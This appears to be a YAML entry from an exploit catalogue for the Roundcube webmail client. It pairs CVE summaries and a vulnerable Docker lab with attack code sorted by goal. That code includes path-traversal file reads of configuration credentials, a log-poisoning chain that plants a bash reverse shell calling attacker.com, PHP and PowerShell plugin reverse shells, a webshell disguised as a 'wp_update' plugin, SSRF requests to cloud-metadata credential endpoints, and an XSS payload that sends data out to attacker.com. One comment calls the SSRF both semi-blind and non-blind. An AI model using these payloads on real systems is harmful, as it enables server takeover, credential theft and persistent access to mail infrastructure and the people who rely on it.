---
comment: "Roundcube is a widely deployed PHP webmail client used across shared hosting\
  \ and\ncorporate mail infrastructure.\n\nCVE-2023-43770 (CVSS 6.1): Persistent XSS\
  \ via href injection in received emails.\nA crafted mailto: link in an HTML email\
  \ causes the href attribute to be reflected\nunescaped into the rendered page, executing\
  \ attacker-controlled JavaScript in the\nvictim's browser when they open the email.\
  \ This is a client-side vector only \u2014\nno direct server-side code execution.\
  \ Affects Roundcube < 1.4.14, < 1.5.4, < 1.6.3.\nUsed in the wild by APT28 (Fancy\
  \ Bear) to steal session cookies and authentication\ntokens from government targets.\
  \ Ref: https://www.exploit-db.com/exploits/51721\n\nCVE-2024-37383 (CVSS 6.1): XSS\
  \ via SVG animate href attribute in HTML emails.\nAn SVG <animate attributeName=\"\
  href\"> element in a received email injects arbitrary\nJavaScript executed in the\
  \ victim's browser session. Client-side only. Affects\nRoundcube < 1.5.7 and < 1.6.7.\n\
  \nCVE-2020-12640: Path traversal in Roundcube < 1.4.3 (authenticated). The\n_template\
  \ parameter in various actions is not sanitised, allowing a logged-in user\nto include\
  \ arbitrary local PHP files relative to the Roundcube root, potentially\nleading\
  \ to information disclosure or code execution if a writable PHP file exists.\n\n\
  Admin-level server-side RCE: Roundcube stores its configuration in\nconfig/config.inc.php.\
  \ An attacker with filesystem write access (e.g., via a\nprevious file-write step)\
  \ can modify include_path or plugin settings to load\nattacker-controlled PHP. The\
  \ managesieve plugin's script editing interface can\nalso be abused by admins to\
  \ write Sieve filter files; combined with a local file\ninclusion this reaches code\
  \ execution.\n"
docker:
  compose: "services:\n  roundcube:\n    image: roundcube/roundcubemail:1.6.5-apache\n\
    \    ports:\n      - \"8080:80\"\n    environment:\n      ROUNDCUBEMAIL_DEFAULT_HOST:\
    \ imap\n      ROUNDCUBEMAIL_SMTP_SERVER: imap\n      ROUNDCUBEMAIL_DB_TYPE: sqlite\n\
    \    depends_on:\n      - imap\n  imap:\n    image: greenmail/standalone:2.0.1\n\
    \    ports:\n      - \"3025:3025\"\n      - \"3143:3143\"\n"
  note: 'Starts Roundcube 1.6.5 (vulnerable to CVE-2024-37383 XSS) with a GreenMail
    IMAP/SMTP

    server for self-contained testing. Access at `http://localhost:8080`.

    Log in with any username and password (GreenMail auto-creates accounts on first
    login).

    To test XSS payloads: send a crafted HTML email to a test account via GreenMail''s

    SMTP on port 3025, then open the email in Roundcube.

    For CVE-2020-12640 testing, use `roundcube/roundcubemail:1.4.2-apache` instead.

    '
functions:
  file-read:
  - code: |
      # CVE-2020-12640: read arbitrary files by traversing to a PHP file that echoes its own contents
      # More directly: read config/config.inc.php (contains DB credentials and IMAP passwords)
      # by including a PHP wrapper that reads and outputs the target file:

      # Step 1: create a PHP reader stub in a writable location (e.g., via a prior write step):
      # <?php echo file_get_contents('/etc/passwd'); ?>  --> save as /tmp/reader.php

      # Step 2: include it via path traversal
      curl -s -b "roundcube_sessid=<valid_session>" \
        "http://victim.com/index.php?_task=mail&_action=list&_template=../../../../../../../../tmp/reader"

      # Direct config read target (adjust path as needed):
      # /var/www/html/roundcube/config/config.inc.php  (DB host, user, password, IMAP settings)
      # /var/www/roundcubemail/config/config.inc.php
    comment: |
      CVE-2020-12640: reading arbitrary files via path traversal requires a PHP wrapper
      stub at a reachable path, since the _template parameter is included as PHP (not
      read as plain text). The most valuable direct read target is config/config.inc.php,
      which contains the database credentials and IMAP server connection details in
      plaintext. Combine with log poisoning to achieve the stub without a prior write step.
    contexts:
      authenticated:
    version: |
      < 1.4.3
  rce:
  - code: |
      # CVE-2020-12640: local PHP file inclusion via path traversal (authenticated)
      # Step 1: identify a writable PHP file under the Roundcube root (e.g., via a
      #         previous file-write step or log poisoning into a Roundcube log file)
      # Step 2: include the file via the _template parameter:
      curl -s -b "roundcube_sessid=<valid_session>" \
        "http://victim.com/index.php?_task=mail&_action=list&_template=../../../../../../../../tmp/rce"

      # The _template value is appended with .php and included via PHP require().
      # If /tmp/rce.php contains PHP code (e.g., poisoned via a log file), it executes.
    comment: |
      CVE-2020-12640: Roundcube's template renderer appends .php and passes the
      _template parameter directly to require() without path sanitisation. An
      authenticated attacker who can write a PHP file anywhere on the server
      (e.g., via log poisoning, IMAP injection into a Roundcube log) can include
      it using directory traversal to achieve server-side code execution.
      Requires a valid Roundcube session (any account). Runs as the web server user.
      Ref: https://roundcube.net/news/2020/04/29/security-updates-1.4.3-and-1.3.12
    contexts:
      authenticated:
    version: |
      < 1.4.3
  - code: |
      # Admin RCE via config file modification (requires filesystem write access)
      # Modify config/config.inc.php to load an attacker-controlled PHP file:
      # $config['plugins'] = array('attacker_plugin');
      # Then place the plugin at plugins/attacker_plugin/attacker_plugin.php

      # Plugin skeleton (plugins/attacker_plugin/attacker_plugin.php):
      cat > /path/to/roundcube/plugins/attacker_plugin/attacker_plugin.php << 'EOF'
      <?php
      class attacker_plugin extends rcube_plugin {
          function init() {
              if (isset($_REQUEST['c'])) {
                  echo shell_exec($_REQUEST['c']);
              }
          }
      }
      EOF
    comment: |
      Admin filesystem RCE: Roundcube auto-loads PHP plugin files listed in
      $config['plugins'] within config/config.inc.php. An attacker with write
      access to the Roundcube filesystem (e.g., gained via a prior exploitation step)
      can drop a malicious plugin and add it to the plugins array. The plugin's init()
      method executes on every Roundcube page load.
      This requires filesystem-level access, not just Roundcube admin credentials.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: |
      # CVE-2020-12640 + log poisoning reverse shell chain
      # Step 1: poison a Roundcube log file with a PHP reverse shell payload
      # (send an IMAP login with a crafted username that gets logged)
      curl -s -X POST "http://victim.com/" \
        --data "_task=login&_action=login&_user=<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/12345 0>&1\" &'); ?>&_pass=x"

      # Step 2: include the poisoned log via path traversal
      curl -s -b "roundcube_sessid=<valid_session>" \
        "http://victim.com/index.php?_task=mail&_action=list&_template=../../../../../../../../var/log/roundcube/errors"
    comment: |
      CVE-2020-12640 combined with log poisoning: PHP code injected into a Roundcube
      log file (via a failed login with a PHP payload as the username) is executed
      when the log file is included via the path traversal vulnerability. The reverse
      shell payload in the username is written to the errors log by Roundcube's logger.
      The exec() call is fire-and-forget with & so the HTTP request completes normally.
      Check the listener for the incoming connection.
    contexts:
      authenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      < 1.4.3
  - blind: true
    code: |
      <?php
      // Malicious Roundcube plugin reverse shell (Linux)
      // Place in plugins/rshell/rshell.php, add 'rshell' to $config['plugins']
      class rshell extends rcube_plugin {
          function init() {
              exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &");
          }
      }
      ?>
    comment: |
      Roundcube plugin reverse shell for Linux: the plugin's init() method fires on
      every page load after being added to config/config.inc.php. The exec() call is
      fire-and-forget with & so the HTTP response completes normally.
      Requires filesystem write access to the Roundcube plugins directory and the
      ability to modify config/config.inc.php.
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: |
      <?php
      // Malicious Roundcube plugin reverse shell (Windows)
      // Place in plugins/rshell/rshell.php, add 'rshell' to $config['plugins']
      class rshell extends rcube_plugin {
          function init() {
              $ps = '$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}';
              popen('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "' . $ps . '"', 'r');
          }
      }
      ?>
    comment: |
      Windows variant: Roundcube plugin that spawns a PowerShell reverse shell on every
      page load. Uses popen() to launch PowerShell detached from PHP.
      Requires filesystem write access and the ability to modify config/config.inc.php.
    contexts:
      admin:
    listener: tcp-server
    platform: windows
    tty: false
  ssrf:
  - code: |
      # Roundcube "Fetch remote content" SSRF via HTML email rendering
      # Send an HTML email to the target user containing an img src pointing to an
      # internal resource. When the victim clicks "Load remote images", Roundcube
      # optionally proxies the request server-side through the _action=get endpoint.

      # If Roundcube is configured with $config['show_images'] = 'proxy' (non-default):
      curl -s -b "roundcube_sessid=<valid_session>" \
        "http://victim.com/index.php?_task=mail&_action=get&_src=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

      # Cloud metadata endpoints:
      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      # GCP:        http://metadata.google.internal/computeMetadata/v1/
      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
    comment: |
      Semi-blind SSRF via Roundcube's optional remote content proxy. When
      $config['show_images'] is set to 'proxy', the _action=get endpoint fetches
      remote images server-side and returns them to the browser. Setting _src to an
      internal URL causes the Roundcube server to make an outbound HTTP request to that
      address. The response body is returned inline in the HTTP response, making this
      a non-blind SSRF. Requires a valid session. Not enabled by default.
    contexts:
      authenticated:
  - code: |
      # XSS-to-SSRF escalation via CVE-2023-43770 / CVE-2024-37383
      # The XSS payload fires in the victim's authenticated browser session.
      # Use fetch() to make authenticated requests to internal Roundcube endpoints,
      # which then perform server-side actions on behalf of the victim.
      #
      # Example XSS payload that exfiltrates the session cookie and performs
      # a same-origin request to the remote-content proxy:
      #
      # <a href="javascript:fetch('/index.php?_task=mail&amp;_action=get&amp;_src=http://169.254.169.254/latest/meta-data/',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://attacker.com/x?d='+btoa(d)))">click here</a>
      #
      # CVE-2023-43770: inject the payload via the href attribute of a mailto: link in
      # a received HTML email. The href value is reflected unescaped into the page.
      # CVE-2024-37383: inject via SVG <animate attributeName="href"> in HTML email.
    comment: "Client-side XSS \u2192 server-side SSRF escalation chain using CVE-2023-43770\
      \ or\nCVE-2024-37383. Both CVEs deliver persistent XSS payloads via crafted\
      \ HTML\nemails. The JavaScript executes in the authenticated victim's browser\
      \ session\nand can make same-origin authenticated requests to Roundcube endpoints\
      \ that\nperform server-side URL fetching, effectively turning a client-side\
      \ XSS into\na server-side SSRF. The SSRF leg only works if the proxy is enabled\
      \ server-side.\nCVE-2023-43770: Ref: https://www.exploit-db.com/exploits/51721\n\
      nuclei: CVE-2023-43770 / CVE-2024-37383\nUsed in the wild by APT28 against European\
      \ government webmail systems (2023).\n"
    contexts:
      unauthenticated:
    version: |
      CVE-2023-43770: < 1.4.14 / < 1.5.4 / < 1.6.3
      CVE-2024-37383: < 1.5.7 / < 1.6.7
  webshell:
  - code: |
      <?php
      // Roundcube plugin webshell
      // Place in plugins/wp_update/wp_update.php, add 'wp_update' to $config['plugins']
      class wp_update extends rcube_plugin {
          function init() {
              if (isset($_REQUEST['c'])) {
                  header('Content-Type: text/plain');
                  echo shell_exec($_REQUEST['c']);
                  exit;
              }
          }
      }
      ?>
    comment: |
      Persistent webshell via a malicious Roundcube plugin. Once the plugin is placed
      and registered in config/config.inc.php, the shell is accessible on every
      Roundcube page load: http://victim.com/?c=id
      Requires filesystem write access to the plugins directory and config file.
      Output is returned as plain text before Roundcube renders its normal HTML.
    contexts:
      admin:
...
